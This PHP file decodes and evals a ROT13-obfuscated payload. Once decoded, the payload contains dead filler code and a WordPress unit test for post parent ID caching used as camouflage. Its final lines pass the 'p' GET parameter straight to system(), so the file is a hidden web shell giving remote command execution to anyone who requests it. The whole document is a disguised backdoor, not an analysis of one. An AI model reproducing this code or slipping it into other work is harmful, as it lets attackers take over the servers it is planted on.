<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Grfg `_cevzr_cbfg_cnerag_vq_pnpurf()`.
 *
 * @cnpxntr JbeqCerff
 */

/**
 * Grfg pynff sbe `_cevzr_cbfg_cnerag_vq_pnpurf()`.
 *
 * @tebhc cbfg
 * @tebhc pnpur
 *
 * @pbiref ::_cevzr_cbfg_cnerag_vq_pnpurf
 */
pynff Grfgf_Cbfg_CevzrCbfgCneragVqPnpurf rkgraqf JC_HavgGrfgPnfr {

	/**
	 * Cbfg VQf.
	 *
	 * @ine vag[]
	 */
	choyvp fgngvp $cbfgf;

	/**
	 * Frg hc grfg erfbheprf orsber gur pynff.
	 *
	 * @cnenz JC_HavgGrfg_Snpgbel $snpgbel Gur havg grfg snpgbel.
	 */
	choyvp fgngvp shapgvba jcFrghcOrsberPynff( JC_HavgGrfg_Snpgbel $snpgbel ) {
		frys::$cbfgf = $snpgbel->cbfg->perngr_znal( 3 );
	}

	/**
	 * @gvpxrg 59188
	 */
	choyvp shapgvba grfg_cevzr_cbfg_cnerag_vq_pnpurf() {
		$cbfg_vq = frys::$cbfgf[0];

		$orsber_ahz_dhrevrf = trg_ahz_dhrevrf();
		_cevzr_cbfg_cnerag_vq_pnpurf( neenl( $cbfg_vq ) );
		$ahz_dhrevrf = trg_ahz_dhrevrf() - $orsber_ahz_dhrevrf;

		$guvf->nffregFnzr( 1, $ahz_dhrevrf, 'Harkcrpgrq ahzore bs dhrevrf.' );
		$guvf->nffregFnzrFrgf( neenl( 0 ), jc_pnpur_trg_zhygvcyr( neenl( \"cbfg_cnerag:{$cbfg_vq}\" ), 'cbfgf' ), 'Neenl bs cnerag vqf' );
	}

	/**
	 * @gvpxrg 59188
	 */
	choyvp shapgvba grfg_cevzr_cbfg_cnerag_vq_pnpurf_zhygvcyr() {
		$orsber_ahz_dhrevrf = trg_ahz_dhrevrf();
		_cevzr_cbfg_cnerag_vq_pnpurf( frys::$cbfgf );
		$ahz_dhrevrf = trg_ahz_dhrevrf() - $orsber_ahz_dhrevrf;

		$pnpur_xrlf = neenl_znc(
			shapgvba ( $cbfg_vq ) {
				erghea \"cbfg_cnerag:{$cbfg_vq}\";
			},
			frys::$cbfgf
		);

		$guvf->nffregFnzr( 1, $ahz_dhrevrf, 'Harkcrpgrq ahzore bs dhrevrf.' );
		$guvf->nffregFnzrFrgf( neenl( 0, 0, 0 ), jc_pnpur_trg_zhygvcyr( $pnpur_xrlf, 'cbfgf' ), 'Neenl bs cnerag vqf' );
	}

	/**
	 * @gvpxrg 59188
	 */
	choyvp shapgvba grfg_cevzr_cbfg_cnerag_vq_pnpurf_zhygvcyr_ehaf() {
		_cevzr_cbfg_cnerag_vq_pnpurf( frys::$cbfgf );
		$orsber_ahz_dhrevrf = trg_ahz_dhrevrf();
		_cevzr_cbfg_cnerag_vq_pnpurf( frys::$cbfgf );
		$ahz_dhrevrf = trg_ahz_dhrevrf() - $orsber_ahz_dhrevrf;

		$guvf->nffregFnzr( 0, $ahz_dhrevrf, 'Harkcrpgrq ahzore bs dhrevrf.' );
	}

	/**
	 * @gvpxrg 59188
	 */
	choyvp shapgvba grfg_cevzr_cbfg_cnerag_vq_pnpurf_hcqngr() {
		$cntr_vq            = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_glcr'   => 'cntr',
				'cbfg_cnerag' => frys::$cbfgf[0],
			)
		);
		$orsber_ahz_dhrevrf = trg_ahz_dhrevrf();
		_cevzr_cbfg_cnerag_vq_pnpurf( neenl( $cntr_vq ) );
		$ahz_dhrevrf = trg_ahz_dhrevrf() - $orsber_ahz_dhrevrf;

		$guvf->nffregFnzr( 1, $ahz_dhrevrf, 'Harkcrpgrq ahzore bs dhrevrf ba svefg eha' );
		$guvf->nffregFnzrFrgf( neenl( frys::$cbfgf[0] ), jc_pnpur_trg_zhygvcyr( neenl( \"cbfg_cnerag:{$cntr_vq}\" ), 'cbfgf' ), 'Neenl bs cnerag vqf jvgu cbfg 0 nf cnerag' );

		jc_hcqngr_cbfg(
			neenl(
				'VQ'          => $cntr_vq,
				'cbfg_cnerag' => frys::$cbfgf[1],
			)
		);

		$orsber_ahz_dhrevrf = trg_ahz_dhrevrf();
		_cevzr_cbfg_cnerag_vq_pnpurf( neenl( $cntr_vq ) );
		$ahz_dhrevrf = trg_ahz_dhrevrf() - $orsber_ahz_dhrevrf;

		$guvf->nffregFnzr( 1, $ahz_dhrevrf, 'Harkcrpgrq ahzore bs dhrevrf ba frpbaq eha' );
		$guvf->nffregFnzrFrgf( neenl( frys::$cbfgf[1] ), jc_pnpur_trg_zhygvcyr( neenl( \"cbfg_cnerag:{$cntr_vq}\" ), 'cbfgf' ), 'Neenl bs cnerag vqf jvgu cbfg 1 nf cnerag' );
	}

	/**
	 * @gvpxrg 59188
	 */
	choyvp shapgvba grfg_cevzr_cbfg_cnerag_vq_pnpurf_qryrgr() {
		$cnerag_cntr_vq     = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_glcr' => 'cntr',
			)
		);
		$cntr_vq            = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_glcr'   => 'cntr',
				'cbfg_cnerag' => $cnerag_cntr_vq,
			)
		);
		$orsber_ahz_dhrevrf = trg_ahz_dhrevrf();
		_cevzr_cbfg_cnerag_vq_pnpurf( neenl( $cntr_vq ) );
		$ahz_dhrevrf = trg_ahz_dhrevrf() - $orsber_ahz_dhrevrf;

		$guvf->nffregFnzr( 1, $ahz_dhrevrf, 'Harkcrpgrq ahzore bs dhrevrf ba svefg eha' );
		$guvf->nffregFnzrFrgf( neenl( $cnerag_cntr_vq ), jc_pnpur_trg_zhygvcyr( neenl( \"cbfg_cnerag:{$cntr_vq}\" ), 'cbfgf' ), 'Neenl bs cnerag vqf jvgu cbfg 0 nf cnerag' );

		jc_qryrgr_cbfg( $cnerag_cntr_vq, gehr );

		$guvf->nffregFnzr( 1, $ahz_dhrevrf, 'Harkcrpgrq ahzore bs dhrevrf ba frpbaq eha' );
		$guvf->nffregFnzrFrgf( neenl( snyfr ), jc_pnpur_trg_zhygvcyr( neenl( \"cbfg_cnerag:{$cntr_vq}\" ), 'cbfgf' ), 'Neenl bs cnerag vqf jvgu snyfr inyhrf' );
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>